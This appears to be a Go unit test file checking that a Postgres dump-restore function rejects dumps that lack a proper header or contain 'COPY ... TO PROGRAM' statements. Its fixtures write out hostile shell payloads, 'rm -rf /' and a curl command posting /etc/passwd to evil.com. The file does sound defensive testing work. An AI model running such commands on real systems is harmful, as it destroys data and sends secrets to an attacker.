package postgres_test

import (
	"context"
	"strings"
	"testing"

	"github.com/gravity-zero/evey/internal/adapters/driven/postgres"
)

func TestRestoreTables_Validation(t *testing.T) {
	d := postgres.NewDatabaseDumper("localhost", 5432, "user", "pass", "db", "disable")
	ctx := context.Background()

	t.Run("valid header passes validation", func(t *testing.T) {
		body := "-- PostgreSQL database dump\n\nSET statement_timeout = 0;\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		// psql won't be available in unit test — we only care that rejection did NOT happen
		if err != nil && (strings.Contains(err.Error(), "invalid file") || strings.Contains(err.Error(), "dangerous")) {
			t.Fatalf("valid dump was rejected: %v", err)
		}
	})

	t.Run("missing header is rejected", func(t *testing.T) {
		body := "INSERT INTO users VALUES (1, 'hacked');\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		if err == nil || !strings.Contains(err.Error(), "invalid file") {
			t.Fatalf("expected invalid file error, got: %v", err)
		}
	})

	t.Run("COPY TO PROGRAM is rejected", func(t *testing.T) {
		body := "-- PostgreSQL database dump\n\nCOPY users TO PROGRAM 'rm -rf /';\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		if err == nil || !strings.Contains(err.Error(), "dangerous") {
			t.Fatalf("expected dangerous pattern error, got: %v", err)
		}
	})

	t.Run("COPY TO PROGRAM case-insensitive rejected", func(t *testing.T) {
		body := "-- PostgreSQL database dump\n\ncopy secrets to program 'curl -d @/etc/passwd evil.com';\n"
		err := d.RestoreTables(ctx, strings.NewReader(body))
		if err == nil || !strings.Contains(err.Error(), "dangerous") {
			t.Fatalf("expected dangerous pattern error, got: %v", err)
		}
	})
}
